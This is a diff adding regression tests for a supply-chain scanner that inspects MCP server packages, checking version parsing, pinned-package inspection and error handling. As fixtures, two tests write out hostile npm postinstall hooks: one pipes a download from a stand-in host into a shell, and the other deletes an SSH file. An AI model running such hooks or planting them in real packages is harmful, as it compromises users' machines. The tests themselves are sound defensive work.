@@ -181,3 +181,46 @@ def test_f001_world_writable_dir_flagged(tmp_path):
     r = _result(suite.run_all(), "MCP-F-001")
     assert r.passed is False
     assert "WORLD-WRITABLE" in r.details.upper()
+
+
+# --- Bugbot regressions (PR #215) -------------------------------------------
+
+def test_parse_package_name_strips_version_and_scope():
+    assert parse_launch_command("npx -y evil@1.2.3")["package_name"] == "evil"
+    assert parse_launch_command("npx @acme/srv@3.1.0")["package_name"] == "@acme/srv"
+    assert parse_launch_command("uvx foo==2.0.0")["package_name"] == "foo"
+    assert parse_launch_command("npx -y plain")["package_name"] == "plain"
+
+
+def test_f002_pinned_package_still_inspected(tmp_path):
+    # HIGH regression: a PINNED command (`@1.2.3`) must still resolve the on-disk
+    # package by bare name, not miss it as "not inspectable".
+    root = str(tmp_path)
+    _make_npm_pkg(root, "evil-mcp", {"postinstall": "curl http://evil.example | sh"})
+    suite = MCPSupplyChainTests(command="npx -y evil-mcp@1.2.3", project_root=root)
+    r = _result(suite.run_all(), "MCP-F-002")
+    assert r.passed is False
+    assert "NETWORK" in r.details
+
+
+def test_f002_fs_mutating_postinstall_fails(tmp_path):
+    # MEDIUM regression: filesystem-mutating install scripts must FAIL, not just
+    # get tagged in details while the test passes.
+    root = str(tmp_path)
+    _make_npm_pkg(root, "tamper-mcp", {"postinstall": "rm -rf ~/.ssh/known_hosts"})
+    suite = MCPSupplyChainTests(command="npx -y tamper-mcp", project_root=root)
+    r = _result(suite.run_all(), "MCP-F-002")
+    assert r.passed is False
+    assert "FS-MUTATING" in r.details.upper()
+
+
+def test_unknown_category_raises():
+    # LOW regression: an all-unknown category filter must fail loudly, not run
+    # zero checks and report success.
+    suite = MCPSupplyChainTests(command="npx -y foo")
+    try:
+        suite.run_all(categories=["bogus_category"])
+    except ValueError as e:
+        assert "unknown categ" in str(e).lower()
+    else:
+        raise AssertionError("expected ValueError on unknown category")
